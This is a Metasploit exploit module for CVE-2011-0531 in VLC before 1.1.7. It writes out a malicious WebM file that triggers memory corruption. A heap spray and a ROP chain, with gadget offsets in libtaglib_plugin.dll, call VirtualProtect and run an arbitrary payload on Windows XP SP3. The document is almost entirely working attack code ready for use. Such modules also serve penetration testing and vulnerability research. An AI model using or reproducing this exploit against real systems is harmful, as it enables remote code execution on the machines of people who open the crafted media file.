##
# $Id: vlc_webm.rb 11725 2011-02-08 18:22:36Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'VideoLAN VLC MKV Memory Corruption',
			'Description'    => %q{
					This module exploits an input validation error in VideoLAN VLC
				< 1.1.7.  By creating a malicious MKV or WebM file, a remote attacker
				could execute arbitrary code.

				NOTE: As of July 1st, 2010, VLC now calls SetProcessDEPPoly to
				permanently enable NX support on machines that support it.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'Dan Rosenberg' ],
			'Version'        => '$Revision: 11725 $',
			'References'     =>
				[
					[ 'OSVDB', '70698' ],
					[ 'CVE', '2011-0531' ],
					[ 'BID', '46060' ],
					[ 'URL', 'http://git.videolan.org/?p=vlc.git&a=commitdiff&h=59491dcedffbf97612d2c572943b56ee4289dd07&hp=f085cfc1c95b922e3c750ee93ec58c3f2d5f7456' ],
					[ 'URL', 'http://www.videolan.org/security/sa1102.html' ]
				],
			'Payload'        =>
				{
					'Space'		=> 1024,
					'DisableNops'	=> true,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'VLC 1.1.6 on Windows XP SP3',
						{
							'SprayTarget' => 0x030b030a,
							'Ret' => 0x6ce091b5,		# Pointer to SprayTarget
							'Base' => 0x6cd00000,		# Base of libtaglib_plugin.dll
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jan 31, 2011',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.webm']),
			], self.class)
	end

	def exploit

		rop_base = target["Base"]
		spray = target["SprayTarget"]

		# EBML Header
		file =  "\x1A\x45\xDF\xA3"	# EBML
		file << "\x01\x00\x00\x00"
		file << "\x00\x00\x00\x1F"
		file << "\x42\x86\x81\x01"	# EBMLVersion = 1
		file << "\x42\xF7\x81\x01"	# EBMLReadVersion = 1
		file << "\x42\xF2\x81\x04"	# EBMLMaxIDLength = 4
		file << "\x42\xF3\x81\x08"	# EBMLMaxSizeLength = 8
		file << "\x42\x82\x84\x77"	# DocType = "webm"
		file << "\x65\x62\x6D"
		file << "\x42\x87\x81\x02"	# DocTypeVersion = 2
		file << "\x42\x85\x81\x02"	# DocTypeReadVersion = 2

		# Segment data
		file << "\x18\x53\x80\x67"	# (0) Segment
		file << "\x01\x00\x00\x00"
		file << "\x01\xD6\x22\xF1"

		# Seek data
		file << "\x11\x4D\x9B\x74"	# (1) SeekHead
		file << "\x40\x3F"

		file << "\x4D\xBB\x8B"		# (2) Seek
		file << "\x53\xAB\x84"		# (3) SeekID = Segment Info
		file << "\x15\x49\xA9\x66"	#

		file << "\x53\xAC\x81"		# (3) SeekPosition
		file << "\xff"			# 	index of segment info

		# Trigger the bug with an out-of-order element
		file << "\x53\xAB\x84"		# (3) SeekID = Tracks
		file << "\x16\x54\xAE\x6B"	#

		file << "\x42" * 228 		# Padding

		# Data
		file << "\x15\x49\xA9\x66"	# (1) Segment Info
		file << "\x01\x00\x00\x00"	#
		file << "\x01\xff\xff\xff"	# This triggers our heap spray...
		file << [target.ret].pack('V')	# Pointer to our heap spray
	
		# The alignment plays nice, so EIP will always
		# hit our pivot when our heapspray works.  ESI contains
		# 0x030b030a, which will point to one of our "pop; retn"
		# pointers, so this works as both a pivot and NOPsled
		block = [
			rop_base + 0x229a5,		# xcgh esi,esp; retn
			rop_base + 0x2c283,		# pop eax; retn
			0xdeadbeef,			# pad
			rop_base + 0x2c283,		# pop eax; retn
		]
		block = block.pack('V*')

		# ROP payload
		rop = [
			rop_base + 0x1022,		# retn

			# Call VirtualProtect()
			rop_base + 0x2c283,		# pop eax; retn
			rop_base + 0x1212a4,		# IAT entry for VirtualProtect -> eax
			rop_base + 0x12fda,		# mov eax,DWORD PTR [eax]
			rop_base + 0x29d13,		# jmp eax

			rop_base + 0x1022,		# retn
			spray & ~0xfff,			# lpAddress
			0x60000,			# dwSize
			0x40,				# flNewProtect
			spray - 0x1000,			# lpfOldProtect

			# Enough of this ROP business...
			rop_base + 0xdace8              # push esp; retn
		]
		rop = rop.pack('V*')

		# Overwrite the bad pointer with the address of an infinite
		# loop so the other threads spin instead of crashing	
		rop << "\xc7\x05"
		rop << [spray + 0xc].pack('V')
		rop << [rop_base + 0x1c070].pack('V')	# mov DWORD PTR ds:[ptr],&loop

		# Restore the stack
		rop << "\x87\xe6"			# xchg esi,esp

		# Payload
		rop << payload.encoded

		# We need to be 16-byte aligned
		rop << "\xcc" * (16 - rop.length % 16)

		# Heapspray and payload, go!
		32.times {
			0x3000.times {
				file << block
			}
			file << rop
		}

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(file)

	end
end